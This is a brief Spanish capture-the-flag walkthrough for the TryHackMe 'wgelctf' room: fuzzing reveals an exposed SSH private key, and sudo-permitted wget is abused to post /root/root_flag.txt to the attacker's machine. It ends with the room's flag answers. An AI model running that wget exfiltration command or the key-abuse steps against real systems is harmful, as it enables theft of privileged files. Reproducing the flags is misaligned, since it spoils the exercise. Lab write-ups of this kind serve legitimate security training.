https://tryhackme.com/room/wgelctf
Hacemos el escaneo con nmap:
 
Y esto es lo que corre por el puerto 80:
 
Si hacemos fuzzing nos encontramos con el directorio sitemap:
 
Si volvemos a hacer fuzzing, nos encontramos con un .ssh, pero debemos usar el diccionario de common.txt:
 
Donde nos encontramos con un id_rsa:
 
Nos lo guardamos:
 
Damos permisos 600 a este id_rsa y entramos a la máquina víctima:
 
Una vez dentro, ejecutamos sudo -l y podemos ver que podemos ejecutar como root el comando wget:
 
Por tanto vamos a subir como sudo la flag de root a nuestra máquina atacante:
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt IP 
```

 
1. 1. 057c67131c3d5e42dd5cd3075b198ff6
   2. b1b968b37519ad1daa6408188649263d
